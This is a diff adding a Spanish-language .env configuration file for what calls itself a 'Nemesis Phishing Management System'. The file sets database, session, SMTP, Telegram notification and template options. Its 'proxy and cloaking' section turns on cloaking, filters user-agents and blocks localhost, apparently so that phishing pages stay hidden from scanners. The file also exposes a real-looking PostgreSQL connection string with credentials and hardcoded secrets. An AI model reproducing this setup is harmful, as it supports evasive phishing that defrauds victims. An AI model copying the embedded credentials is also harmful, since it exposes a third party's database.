@@ -1,0 +1,192 @@
+# =============================================================================
+# 🚀 NEMESIS PHISHING MANAGEMENT SYSTEM - CONFIGURACIÓN COMPLETA
+# =============================================================================
+# ✅ Archivo .env listo para usar - Configuración optimizada para producción
+# 📝 GUARDA ESTE ARCHIVO COMO .env EN LA RAÍZ DE TU PROYECTO
+
+# =============================================================================
+# 🗄️ CONFIGURACIÓN DE BASE DE DATOS (OBLIGATORIO)
+# =============================================================================
+# URL completa de conexión a PostgreSQL
+# 🔧 REEMPLAZA CON TU URL DE BASE DE DATOS:
+DATABASE_URL=postgresql://neondb_owner:npg_VceSDhEN0j7d@ep-green-hall-ad9gvxfc-pooler.c-2.us-east-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require
+
+# =============================================================================
+# 🌐 CONFIGURACIÓN DEL SERVIDOR
+# =============================================================================
+# Entorno de ejecución (development/production)
+NODE_ENV=development
+
+# Puerto de la aplicación
+PORT=5000
+
+# URL base de la aplicación
+APP_URL=http://localhost:5000
+
+# =============================================================================
+# 🔐 CONFIGURACIÓN DE SESIONES Y AUTENTICACIÓN
+# =============================================================================
+# Clave secreta para firmar sesiones - CAMBIA EN PRODUCCIÓN
+SESSION_SECRET=nemesis_phishing_secret_key_2025_ultra_secure_random_string_for_sessions_12345
+
+# Configuración OpenID (para Replit Auth - opcional)
+REPL_ID=tu_repl_id_aqui
+ISSUER_URL=https://replit.com/oidc
+REPLIT_DOMAINS=tu-dominio.replit.app,tu-proyecto.com
+
+# =============================================================================
+# 📱 NOTIFICACIONES TELEGRAM (OPCIONAL)
+# =============================================================================
+# Token del bot de Telegram para notificaciones
+TELEGRAM_BOT_TOKEN=tu_telegram_bot_token_aqui
+
+# Chat ID para recibir notificaciones
+TELEGRAM_CHAT_ID=tu_telegram_chat_id_aqui
+
+# URL webhook para notificaciones externas
+WEBHOOK_URL=https://tu-webhook.com/notifications
+
+# =============================================================================
+# 🔒 CONFIGURACIÓN DE SEGURIDAD
+# =============================================================================
+# Dominios permitidos para CORS (separados por comas)
+ALLOWED_ORIGINS=http://localhost:3000,http://localhost:5000,https://tu-dominio.com
+
+# Clave de encriptación para datos sensibles
+ENCRYPTION_KEY=nemesis_encryption_key_ultra_secure_2025_change_in_production
+
+# =============================================================================
+# 📊 CONFIGURACIÓN DE LOGGING
+# =============================================================================
+# Nivel de logging (error, warn, info, debug)
+LOG_LEVEL=info
+
+# Archivo de logs (opcional)
+LOG_FILE=logs/nemesis.log
+
+# =============================================================================
+# 🌍 CONFIGURACIÓN DE LOCALIZACIÓN
+# =============================================================================
+# Zona horaria para logs y notificaciones
+TZ=America/Mexico_City
+
+# Idioma de la aplicación
+LOCALE=es-MX
+
+# =============================================================================
+# ⚡ CONFIGURACIÓN DE RENDIMIENTO
+# =============================================================================
+# Máximo de conexiones a la base de datos
+DB_MAX_CONNECTIONS=10
+
+# Timeout de conexión (ms)
+DB_CONNECTION_TIMEOUT=10000
+
+# Tiempo de vida de sesiones inactivas (ms)
+SESSION_MAX_AGE=604800000
+
+# =============================================================================
+# 📧 CONFIGURACIÓN DE EMAIL (OPCIONAL)
+# =============================================================================
+# Configuración SMTP para envío de emails
+SMTP_HOST=smtp.gmail.com
+SMTP_PORT=587
+SMTP_USER=tu-email@gmail.com
+SMTP_PASS=tu-password-de-aplicacion
+SMTP_FROM=Nemesis System <tu-email@gmail.com>
+
+# =============================================================================
+# 🎯 CONFIGURACIÓN DE TEMPLATES
+# =============================================================================
+# URL base para recursos estáticos
+STATIC_URL=https://tu-cdn.com/assets
+
+# Directorio de templates personalizados
+TEMPLATES_DIR=templates
+
+# =============================================================================
+# 🚦 CONFIGURACIÓN DE MONITOREO
+# =============================================================================
+# Habilitar métricas de rendimiento
+ENABLE_METRICS=true
+
+# URL para health checks
+HEALTH_CHECK_URL=/health
+
+# Intervalo de limpieza automática (ms)
+CLEANUP_INTERVAL=3600000
+
+# =============================================================================
+# 🛡️ CONFIGURACIÓN DE PROXY Y CLOAKING
+# =============================================================================
+# User-Agents permitidos (separados por comas)
+ALLOWED_USER_AGENTS=Mozilla,Chrome,Safari,Edge
+
+# IPs bloqueadas (separadas por comas)
+BLOCKED_IPS=127.0.0.1,::1
+
+# Habilitar cloaking automático
+ENABLE_CLOAKING=true
+
+# =============================================================================
+# 💾 CONFIGURACIÓN DE BACKUP
+# =============================================================================
+# Habilitar backups automáticos
+ENABLE_AUTO_BACKUP=false
+
+# Directorio de backups
+BACKUP_DIR=backups
+
+# Intervalo de backup (en horas)
+BACKUP_INTERVAL=24
+
+# =============================================================================
+# 🔧 CONFIGURACIÓN AVANZADA
+# =============================================================================
+# Habilitar modo debug
+DEBUG=false
+
+# Habilitar rate limiting
+ENABLE_RATE_LIMIT=true
+
+# Máximo de requests por minuto
+RATE_LIMIT_MAX=100
+
+# Habilitar compresión gzip
+ENABLE_COMPRESSION=true
+
+# =============================================================================
+# 📝 INSTRUCCIONES DE INSTALACIÓN
+# =============================================================================
+# 
+# 1. 📋 GUARDA ESTE ARCHIVO COMO .env EN LA RAÍZ DE TU PROYECTO
+# 2. ✅ CONFIGURA TU DATABASE_URL (obligatorio)
+# 3. 🔐 CAMBIA SESSION_SECRET en producción
+# 4. 📱 CONFIGURA Telegram (opcional)
+# 5. 🌐 AJUSTA ALLOWED_ORIGINS según tus dominios
+#
+# 🚀 COMANDOS PARA INICIAR:
+# 
+# Windows:
+#   npm install
+#   npm run dev
+#   
+# O usar los scripts incluidos:
+#   start-windows.bat
+#   start-windows.ps1
+#   dev-simple.bat
+#
+# Linux/Mac:
+#   npm install  
+#   npm run dev
+#
+# 🔧 COMANDOS DE BASE DE DATOS:
+#   npm run db:push        (crear tablas)
+#   npm run db:push --force (forzar sincronización)
+#
+# =============================================================================
+# 📋 ESTADO: ✅ Configuración completa y optimizada
+# 🔄 VERSIÓN: 2.0 - Con reconexión automática de BD
+# 📅 ACTUALIZADO: Septiembre 2025
+# 🎯 COMPATIBLE: Windows, Linux, Mac
+# =============================================================================
